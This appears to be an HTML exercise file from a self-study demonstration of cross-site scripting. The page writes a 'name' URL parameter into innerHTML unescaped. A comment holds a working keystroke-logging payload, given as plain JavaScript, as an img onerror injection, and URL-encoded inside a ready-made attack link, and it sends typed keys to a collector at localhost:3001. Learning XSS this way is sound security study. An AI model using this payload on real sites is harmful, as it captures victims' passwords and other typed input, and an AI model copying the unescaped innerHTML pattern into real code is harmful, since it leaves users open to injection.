<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xss - ex2</title>
</head>

<body>
    <div>
        Welcome, <span id="username"></span>!

        <h2>This is the example of : capturing keystrokes</h2>

        <!-- below code we will pass to url 
        
            var timeout;
            var buffer = "";
            document.querySelector('body').addEventListener('keypress', function(event) {
                if (event.which !== 0) {
                    clearTimeout(timeout);
                    buffer += String.fromCharCode(event.which);
                    timeout = setTimeout(function() {
                        var xhr = new XMLHttpRequest();
                        var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
                        xhr.open('GET', uri);
                        xhr.send();
                        buffer = "";
                    }, 400);
                }
            });
            
            
            <img src="error" onerror="var timeout, buffer=\'\'; document.querySelector(\'body\').addEventListener(\'keypress\', function(event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which); timeout = setTimeout(function() { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });"/>

            encoded 
            %3Cimg%20src%3D%22error%22%20onerror%3D%22var%20timeout%2C%20buffer%3D''%3B%20document.querySelector('body').addEventListener('keypress'%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20'http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D'%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open('GET'%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20''%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%2F%3E




            open this url
            http://127.0.0.1:5500/vulnerability/ex4.html?name=%3Cimg%20src%3D%22error%22%20onerror%3D%22var%20timeout%2C%20buffer%3D%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%2F%3E

            -->




    </div>

    <!-- official script  -->
    <script>
        // function to set cookies
        function setCookie(name, value, days) {
            const date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            const expires = "expires=" + date.toUTCString();
            document.cookie = name + "=" + value + ";" + expires + ";path=/"
        }

        // set cookie with name=exampleCookie and value=hello, cookie
        setCookie("exampleCookie", "hello, cookie", 7);
    </script>

    <!-- vulnerable code - hackers code -->
    <script>
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name');
        document.getElementById('username').innerHTML = name;
    </script>

</body>

</html>